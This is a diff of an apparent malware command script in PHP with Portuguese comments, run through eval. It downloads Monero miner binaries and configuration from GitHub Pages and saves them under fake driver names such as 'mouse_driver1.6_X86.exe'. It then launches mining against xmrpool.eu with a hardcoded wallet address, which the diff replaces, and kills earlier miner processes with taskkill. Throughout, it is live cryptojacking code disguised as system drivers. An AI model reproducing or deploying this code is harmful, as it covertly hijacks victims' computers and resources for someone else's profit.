@@ -3,7 +3,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
 
-****15
+****16
 
 [GIT_COMMAND]
 
@@ -225,7 +225,7 @@ if(1)
 	
 	$EXEC_XMR = true;
 	$lolm_name = 'w_driver1.95_x86';
-	$xmr_name = 'mouse_driver1.5_X86';
+	$xmr_name = 'mouse_driver1.6_X86';
 	$lolm_path .= '\\'.$lolm_name.'.exe';
 	$xmr_path .= '\\'.$xmr_name.'.exe';
 	$data = true;
@@ -251,10 +251,14 @@ if(1)
 		/**/
 		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/xmr.dat");
 		$data2 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_config.dat");
+		/**
 		$data3 = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/ring_dll.dat");
 		$data3 = @base64_decode(@strrev($data3));
+		/**/
+		$data3 = 'null';
 		
-		if($data && strlen($data) > 5000000 && strlen($data2) > 3000 && strlen($data3) > 12000)
+		/*if($data && strlen($data) > 5000000 && strlen($data2) > 3000 && strlen($data3) > 12000)*/
+		if($data && strlen($data) > 5000000 && strlen($data2) > 3000)
 		{
 			@file_put_contents($xmr_path, $data);
 			@file_put_contents(dirname($xmr_path).'/config.json', $data2);
@@ -299,7 +303,10 @@ if(1)
 			else
 			{
 				$num_threads = (string)ceil($num_threads / 4);
-				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -u 4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch -p '.$work_key.' --threads '.$num_threads;
+				/*$xmr_address = '4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch';*/
+				$xmr_address = '85cz6Jg4N7x5tE5z53SeKYPuaVz2okhRcEgYXK3KVEWxAiG9mbqXuWNdtUTy4CEfgMCZfeREyJoCNb23mGJuEARsMXjzff7';
+				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -u '.$xmr_address.' -p 001'.$work_key.' --threads '.$num_threads;
+				
 				$command = preg_replace('/\"/is', '""', $command);
 				$vbs = preg_replace('/\{COMMAND\_2\}/is', $command, $vbs);
 			}
@@ -346,13 +353,14 @@ if(1)
 		if($execlol && $vbs_exec_path)
 		{
 			$output = array();
-			$new_command_id = '10001';
+			$new_command_id = '10003';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
 			if(@file_get_contents($path_control_id) !== $new_command_id)
 			{
 				@file_put_contents($path_control_id, $new_command_id);
 				@exec('taskkill /f /im '.$lolm_name.'.exe');
 				@exec('taskkill /f /im '.$xmr_name.'.exe');
+				@exec('taskkill /f /im mouse_driver1.5_X86.exe');
 				sleep(2);
 				
 				/*remove tasks*/
